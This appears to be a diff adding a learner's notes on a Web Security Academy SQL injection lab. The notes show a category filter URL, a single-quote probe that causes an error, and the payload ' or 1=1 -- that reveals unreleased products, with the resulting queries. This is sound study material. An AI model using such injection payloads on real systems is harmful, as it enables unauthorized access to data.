@@ -1,0 +1,15 @@
+sql-injection: product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+URL: https://0ab9001203111baa81cf481f009d00b5.web-security-academy.net/
+
+Category URL: https://0ab9001203111baa81cf481f009d00b5.web-security-academy.net/filter?category=gifts
+
+Injection1: https://0ab9001203111baa81cf481f009d00b5.web-security-academy.net/filter?category='
+Result: 501 error, maybe a syntax error and the website crashed because of single '
+SQL query: SELECT * FROM products WHERE category = ''' AND released = 1
+
+Injection2: https://0ab9001203111baa81cf481f009d00b5.web-security-academy.net/filter?category=' or 1=1 --
+Result: Displayed all the released and unreleased products -- Passed
+SQL query: SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
